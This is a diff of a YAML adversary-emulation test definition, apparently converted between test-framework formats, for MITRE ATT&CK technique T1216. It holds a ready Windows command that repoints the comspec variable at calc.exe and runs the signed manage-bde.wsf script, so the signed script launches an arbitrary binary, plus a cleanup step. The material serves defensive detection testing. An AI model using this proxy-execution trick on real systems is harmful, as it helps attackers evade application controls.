@@ -1,15 +1,16 @@
-- id: a3556061-5725-579b-8966-f0c07aa31eb0
+- requirements: []
   name: Soumaia ART Tests - manage-bde.wsf Signed Script Command Execution
   description: Executes the signed manage-bde.wsf script with options to execute an arbitrary command.
   tactic: stealth
-  technique:
-    attack_id: T1216
-    name: Signed Script Proxy Execution
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          set comspec=%windir%\System32\calc.exe
-          cscript %windir%\System32\manage-bde.wsf
-        cleanup: |-
-          set comspec=%windir%\System32\cmd.exe
+  technique_id: T1216
+  technique_name: Signed Script Proxy Execution
+  executors:
+  - cleanup:
+    - set comspec=%windir%\System32\cmd.exe
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: set comspec=%windir%\System32\calc.exe & cscript %windir%\System32\manage-bde.wsf
+  id: a3556061-5725-579b-8966-f0c07aa31eb0
